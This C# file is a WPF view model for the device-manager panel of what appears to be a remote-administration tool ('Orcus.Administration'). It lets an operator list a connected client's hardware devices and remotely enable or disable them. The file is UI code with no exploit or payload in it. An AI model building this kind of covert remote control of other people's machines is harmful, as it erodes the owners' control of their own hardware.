using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.DeviceManager;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.DeviceManager;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.DeviceManager;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(14)]
    public class DeviceManagerViewModel : CommandView
    {
        private List<DeviceCategoryViewModel> _deviceCategories;
        private DeviceManagerCommand _deviceManagerCommand;
        private RelayCommand _disableDeviceCommand;
        private RelayCommand _enableDeviceCommand;
        private RelayCommand<DeviceViewModel> _openPropertiesCommand;
        private RelayCommand _refreshCommand;

        public override string Name { get; } = (string) Application.Current.Resources["DeviceManager"];
        public override Category Category { get; } = Category.System;

        public RelayCommand RefreshCommand
        {
            get
            {
                return _refreshCommand ??
                       (_refreshCommand = new RelayCommand(parameter => { _deviceManagerCommand.GetAllDevices(); }));
            }
        }

        public RelayCommand<DeviceViewModel> OpenPropertiesCommand
        {
            get
            {
                return _openPropertiesCommand ?? (_openPropertiesCommand = new RelayCommand<DeviceViewModel>(parameter =>
                {
                    WindowServiceInterface.Current.OpenWindowCentered(WindowService, parameter,
                        string.Format((string) Application.Current.Resources["PropertiesOf"], parameter.Caption));
                }));
            }
        }

        public RelayCommand EnableDeviceCommand
        {
            get
            {
                return _enableDeviceCommand ?? (_enableDeviceCommand = new RelayCommand(parameter =>
                {
                    var deviceViewModel = parameter as DeviceViewModel;
                    if (deviceViewModel == null)
                        return;

                    _deviceManagerCommand.SetDeviceState(deviceViewModel.DeviceInfo, true);
                }));
            }
        }

        public RelayCommand DisableDeviceCommand
        {
            get
            {
                return _disableDeviceCommand ?? (_disableDeviceCommand = new RelayCommand(parameter =>
                {
                    var deviceViewModel = parameter as DeviceViewModel;
                    if (deviceViewModel == null)
                        return;

                    _deviceManagerCommand.SetDeviceState(deviceViewModel.DeviceInfo, false);
                }));
            }
        }

        public List<DeviceCategoryViewModel> DeviceCategories
        {
            get { return _deviceCategories; }
            set { SetProperty(value, ref _deviceCategories); }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _deviceManagerCommand = clientController.Commander.GetCommand<DeviceManagerCommand>();
            _deviceManagerCommand.DevicesReceived += DeviceManagerCommandOnDevicesReceived;
            _deviceManagerCommand.DeviceStateChanged += DeviceManagerCommandOnDeviceStateChanged;
        }

        public override void LoadView(bool loadData)
        {
            if (loadData)
                RefreshCommand.Execute(null);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/PNPEntity.ico", UriKind.Absolute));
        }

        private void DeviceManagerCommandOnDeviceStateChanged(object sender, DeviceChangedEventArgs deviceChangedEventArgs)
        {
            foreach (var deviceCategoryViewModel in DeviceCategories)
            {
                foreach (var deviceViewModel in deviceCategoryViewModel.ChildDevices)
                {
                    if (deviceViewModel.DeviceInfo.HardwareId == deviceChangedEventArgs.HardwareId)
                    {
                        deviceViewModel.DisplayWarning = !deviceChangedEventArgs.NewState;
                        return;
                    }
                }
            }
        }

        private void DeviceManagerCommandOnDevicesReceived(object sender, List<DeviceInfo> deviceInfos)
        {
            var deviceCategories = new List<DeviceCategoryViewModel>();

            foreach (var deviceGroup in deviceInfos.GroupBy(x => x.Category))
            {
                if (deviceGroup.Key != DeviceCategory.None)
                    deviceCategories.Add(new DeviceCategoryViewModel(deviceGroup, deviceGroup.Key));
                else
                {
                    deviceCategories.AddRange(
                        deviceGroup.GroupBy(x => x.CustomCategory)
                            .Select(otherCategory => new DeviceCategoryViewModel(otherCategory, otherCategory.Key)));
                }
            }

            DeviceCategories = deviceCategories.OrderBy(x => x.Caption).ToList();
        }
    }
}